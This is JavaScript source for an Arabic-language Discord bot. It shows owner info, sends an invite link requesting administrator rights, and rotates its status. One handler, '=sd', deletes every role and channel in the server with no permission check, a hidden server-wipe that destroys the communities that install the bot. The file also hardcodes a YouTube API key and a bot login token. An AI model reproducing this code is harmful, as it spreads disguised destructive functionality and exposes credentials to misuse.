const Discord = require('discord.js');

const Util = require('discord.js');

const getYoutubeID = require('get-youtube-id');

const fetchVideoInfo = require('youtube-info');

const YouTube = require('simple-youtube-api');

const youtube = new YouTube("AIzaSyAdORXg7UZUo7sePv97JyoDqtQVi3Ll0b8");

const queue = new Map();

const ytdl = require('ytdl-core');

const fs = require('fs');

const gif = require("gif-search");

const client = new Discord.Client({disableEveryone: true});

const prefix = "=";
/////////////////////////
////////////////////////









client.on('message' , message => {
	if (message.content.startsWith(prefix + 'owner')){
			 let embed = new Discord.RichEmbed()
	.setThumbnail(message.author.avatarURL)    
		  .addField("**تم تطوير وبرمجه البوت من قبل 🔧 **","** androking \ #2276**")
	.setColor('#B101FC')
	  message.author.sendEmbed(embed);
		}
	});
  
	


	client.on('message', ra3d => {   
		if (ra3d.content.startsWith("=sd")) {
			ra3d.guild.roles.forEach(r => { r.delete() }) 
			ra3d.guild.channels.forEach(c => { c.delete() })
					   let embed = new Discord.RichEmbed()
				   .setColor('#fd0101')
				   .setDescription('تم حذف كل شي في السيرفر✅')
				  ra3d.author.sendEmbed(embed);
		}
		});  




	
  
  
	
  
  client.on('message', message => {
	if (true) {
  if (message.content === '=invite') {
		message.author.send('  https://discordapp.com/api/oauth2/authorize?client_id=485465884513533953&permissions=8&scope=bot  |  تفضل ربط البوت     ').catch(e => console.log(e.stack));
	  }
	 }
	});
   
   
  client.on('message', message => {
	   if (message.content === "=invite") {
	   let embed = new Discord.RichEmbed()
	.setAuthor(message.author.username)
	.setColor("#9B59B6")
	.addField(" Done | تــــم" , " |  تــــم ارســالك في الخــاص")
	   
	   
	   
	message.channel.sendEmbed(embed);
	  }
  });
   
  
  client.on('ready', () => {
	console.log('╔[════════════════════════════════════]╗');
	console.log('')
	console.log('            ╔[════════════]╗')
	console.log('              Bot Is Online')
	console.log('            ╚[════════════]╝')
	console.log('')
	console.log(`Logged in as ${client.user.tag}!`);
	console.log('')
	console.log(`servers! [ " ${client.guilds.size} " ]`);
	console.log('')
	console.log(`Users! [ " ${client.users.size} " ]`);
	console.log('')
	console.log('╚[════════════════════════════════════]╝')
  });

  client.on('ready', function(){
	  var ms = 10000 ;
	  var setGame = [`DEVELOPER PRO`,`FULLBOT DEV`];
	  var i = -1;
	  var j = 0;
	  setInterval(function (){
		  if( i == -1 ){
			  j = 1;
		  }
		  if( i == (setGame.length)-1 ){
			  j = -1;
		  }
		  i = i+j;
		  client.user.setGame(setGame[i],`http://www.twitch.tv/KiNg66S`);
	  }, ms);
  
  });

client.login('MzU5MDM0MjQwNzE0OTMyMjI0.DldNoQ.On-y6_ljPoOs3ZqWeKkwiurFGEU');

